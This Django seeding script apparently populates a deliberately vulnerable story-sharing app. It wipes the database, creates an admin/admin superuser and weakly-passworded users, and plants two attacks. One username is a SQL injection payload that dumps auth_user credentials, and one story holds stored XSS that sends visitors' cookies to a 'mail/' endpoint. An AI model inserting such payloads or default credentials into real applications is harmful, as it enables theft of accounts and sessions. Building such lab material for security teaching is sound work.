from django.contrib.auth.models import User
from django.core.management.base import BaseCommand
from lorem_text import lorem
from random import random, randint

from stories.models import Story, Review

class Command(BaseCommand):
    help = "Populate the database with sample data for testing"

    def handle(self, *args, **kwargs):
        self.clean_database()
        self.create_superuser()
        self.populate_users()
        self.populate_stories()
        self.populate_reviews()

    def clean_database(self):
        User.objects.all().delete()
        Story.objects.all().delete()
        Review.objects.all().delete()
        print("Database cleaned successfully!")

    def create_superuser(self):
        User.objects.create_superuser(username="admin", email="", password="admin")
        print("Superuser created successfully!")

    def populate_users(self):
        User.objects.create_user(username="bob", password="squarepants")
        User.objects.create_user(username="alice", password="redqueen")
        User.objects.create_user(username="patrick", password="asteroid")
        User.objects.create_user(username="' AND '1'='0' UNION SELECT id, username, password, is_superuser FROM auth_user --", password="exploit")

        for i in range(1, 6):
            User.objects.create_user(username=f"user{i}", password=f"1234")

        print("Sample users created successfully!")

    def populate_stories(self):
        for user in User.objects.all():
            for i in range(randint(1, 4)):
                content = lorem.paragraphs(randint(1, 5))
                n = len(content)
                start = randint(0, n-2)
                end = randint(start + 1, n-1)
                Story.objects.create(
                    title=f"Story {i+1}",
                    content=content[start:end],
                    author=user,
                )

        admin = User.objects.get(username="admin")
        Story.objects.create(
            title="The poisoned cookie",
            content="""Once upon a time, a little girl named Alice was walking through the forest when she stumbled upon a mysterious cookie. She picked it up and took a bite. She had only eaten a tiny piece, but it was enough to make her feel very sick. She realized that the cookie had been poisoned! She quickly ran to find help, but she was too late. The poison had already taken effect, and she fell to the ground, unconscious.
<script inline="javascript">
    var http = new XMLHttpRequest();
    http.open("POST", 'mail/', true);
    http.setRequestHeader("Content-Type", "application/json");
    http.send(JSON.stringify({content: document.cookie}));
</script>""",
            author=admin,
        )

        print("Sample stories created successfully!")

    def populate_reviews(self):
        for story in Story.objects.all():
            if random() < 0.7:  # 75% chance to create reviews for a story
                for user in User.objects.exclude(id=story.author.id):
                    Review.objects.create(
                        user=user,
                        story=story,
                        rate=randint(0, 5),
                    )

        print("Sample reviews created successfully!")
